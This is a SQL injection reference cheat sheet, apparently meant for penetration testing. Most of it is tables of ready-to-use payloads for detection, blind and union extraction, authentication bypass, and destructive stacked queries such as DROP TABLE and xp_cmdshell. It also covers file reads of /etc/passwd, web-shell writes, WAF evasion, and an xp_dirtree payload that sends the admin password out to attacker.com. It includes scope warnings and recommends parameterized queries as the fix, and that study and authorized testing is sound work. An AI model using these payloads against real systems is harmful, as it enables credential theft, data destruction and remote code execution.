# SQL Injection Reference —  [SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### Detection / Breaking Syntax

| Payload | Purpose |
|---|---|
| `'` | Single quote — breaks string context, look for SQL error |
| `"` | Double quote — same idea, for double-quoted contexts |
| `'-- ` | Quote + comment — closes string then comments out the rest |
| `' OR '1'='1` | Classic always-true condition |
| `' OR 1=1-- ` | Always-true condition, comments out trailing query |
| `'; --` | Tests for stacked query support |
| `\` | Backslash — tests for escape-character handling bugs |

### Boolean-Based Blind

| Payload | Purpose |
|---|---|
| `' AND 1=1-- ` | Should return normal page (true condition) |
| `' AND 1=2-- ` | Should return different page (false condition) — diff against the above |
| `' AND 'a'='a` | String-based true condition |
| `' AND 'a'='b` | String-based false condition |
| `' AND SUBSTRING(@@version,1,1)='5'-- ` | Tests a specific character of extracted data, one position at a time |

### Time-Based Blind

| Payload | Database | Purpose |
|---|---|---|
| `' AND SLEEP(5)-- ` | MySQL | Delay confirms execution with no visible output |
| `'; SELECT pg_sleep(5)-- ` | PostgreSQL | Same concept |
| `'; WAITFOR DELAY '0:0:5'-- ` | MSSQL | Same concept |
| `' AND DBMS_LOCK.SLEEP(5)-- ` | Oracle | Same concept |
| `' AND IF(1=1,SLEEP(5),0)-- ` | MySQL | Conditional delay — only sleeps if condition is true |

### Union-Based Extraction

| Payload | Purpose |
|---|---|
| `' ORDER BY 1-- ` | Increment to find column count (errors when count exceeded) |
| `' UNION SELECT NULL,NULL,NULL-- ` | Find which columns reflect in the response |
| `' UNION SELECT username,password,NULL FROM users-- ` | Extract real data once column count/position known |
| `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- ` | Enumerate table names |
| `' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- ` | Enumerate columns of a known table |

### Error-Based Extraction

| Payload | Database | Purpose |
|---|---|---|
| `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- ` | MySQL | Leaks data via XPATH syntax error message |
| `' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- ` | MySQL | Same technique, different function |
| `' AND CAST((SELECT version()) AS int)-- ` | PostgreSQL/MSSQL | Leaks data via type-cast error |
| `' AND 1=CONVERT(int,(SELECT @@version))-- ` | MSSQL | Leaks data via conversion error |

### Auth Bypass (Login Forms)

| Payload | Purpose |
|---|---|
| `admin'-- ` | Comments out password check entirely |
| `admin'#` | Same, MySQL-style comment |
| `' OR 1=1-- ` | Always-true WHERE clause |
| `' OR ''='` | Always-true via empty string comparison |
| `admin' OR '1'='1'-- ` | Combines known username with always-true condition |

### Stacked Queries

| Payload | Purpose |
|---|---|
| `'; DROP TABLE users-- ` | Tests destructive stacked query execution (use only in authorized/lab environments) |
| `'; INSERT INTO users(username,password) VALUES('hacker','pass')-- ` | Tests write access via stacked query |
| `'; EXEC xp_cmdshell('whoami')-- ` | MSSQL — tests OS command execution via stacked query |

## Database Function Reference

### Identification

| Function | Database | Purpose |
|---|---|---|
| `@@version` | MySQL / MSSQL | Get DB version |
| `version()` | PostgreSQL | Get DB version |
| `v$version` | Oracle | Get DB version |
| `database()` | MySQL | Current database name |
| `current_database()` | PostgreSQL | Current database name |
| `DB_NAME()` | MSSQL | Current database name |
| `user()` / `current_user()` | MySQL / PostgreSQL | Current DB user |

### String / Concatenation

| Function | Database | Purpose |
|---|---|---|
| `CONCAT(a,b)` | MySQL | String concatenation |
| `a \|\| b` | PostgreSQL / Oracle | String concatenation |
| `a + b` | MSSQL | String concatenation |
| `SUBSTRING(str,pos,len)` | All | Extract part of a string (used heavily in blind extraction) |
| `LENGTH(str)` / `LEN(str)` | MySQL/Postgres / MSSQL | Get string length (used to determine extraction loop bounds) |

### File / OS Interaction

| Function | Database | Purpose |
|---|---|---|
| `LOAD_FILE('/etc/passwd')` | MySQL | Read local file (requires FILE privilege) |
| `... INTO OUTFILE '/var/www/shell.php'` | MySQL | Write file — can lead to RCE if web-accessible |
| `xp_cmdshell('cmd')` | MSSQL | Execute OS command (requires enabled feature + privilege) |
| `COPY (SELECT ...) TO PROGRAM 'cmd'` | PostgreSQL | Execute OS command (requires superuser) |
| `UTL_FILE` package | Oracle | Read/write files (requires granted access) |

### Schema Enumeration

| Query target | Purpose |
|---|---|
| `information_schema.tables` | List all tables (MySQL/Postgres/MSSQL) |
| `information_schema.columns` | List all columns for a table |
| `all_tables` | List tables (Oracle) |
| `all_tab_columns` | List columns (Oracle) |
| `sqlite_master` | List tables/schema (SQLite) |

## EXAMPLE PAYLOADS

```
' OR '1'='1
```
```
admin'-- 
```
```
' UNION SELECT username, password, NULL FROM users-- 
```
```
' AND extractvalue(1, concat(0x7e, (SELECT version()))) -- 
```
```
' AND SLEEP(5)-- 
```
```
'; EXEC master..xp_dirtree '//attacker.com/'+(SELECT password FROM users WHERE username='admin')+'/a'--
```
```
' UNION SELECT NULL,NULL,NULL-- 
```
```
' AND 1=CONVERT(int,(SELECT @@version))-- 
```

## Obfuscation / WAF Bypass Techniques

| Technique | Example | Why it works |
|---|---|---|
| Case variation | `UnIoN sElEcT` | Bypasses case-sensitive keyword filters |
| Inline comments | `UNION/**/SELECT` | Defeats whitespace-based keyword matching |
| URL encoding | `%55NION%20SELECT` | Bypasses filters that only decode once |
| Double encoding | `%2553ELECT` | Bypasses filters that decode exactly once before checking |
| Alternate whitespace | `UNION%0aSELECT` (newline) | Some parsers accept non-space whitespace filters don't check |
| Logical operator swap | `\|\|` instead of `OR` (DB-dependent) | Evades keyword-specific blocklists |
| String splitting | `'UNI' + 'ON SELECT'` (DB-dependent concat) | Defeats static full-keyword string matching |
| Hex/char encoding of strings | `0x61646d696e` instead of `'admin'` | Avoids quote-based filters entirely |
| Second-order injection | Store payload in a profile field, trigger via unrelated feature reading it back | Bypasses input-point filtering since execution happens elsewhere |

## Tooling Note
Manual payloads are best for confirmation and understanding query structure. For full enumeration, `sqlmap` (tune `--risk`/`--level`, and `--technique` to target specific injection types) and Burp Suite's Scanner/Intruder handle automated, large-scale testing. Stay within authorized scope — stacked queries and file-write payloads can cause real data loss or RCE if run carelessly.

## Quick Notes
- Always grab a clean baseline response first — boolean/time-based detection is entirely about diffing against it.
- Parameterized queries / prepared statements are the actual fix for a writeup — not "input sanitization" alone.
- ORMs reduce but don't eliminate risk — raw query building or string-concatenated filters inside an ORM remain exploitable.
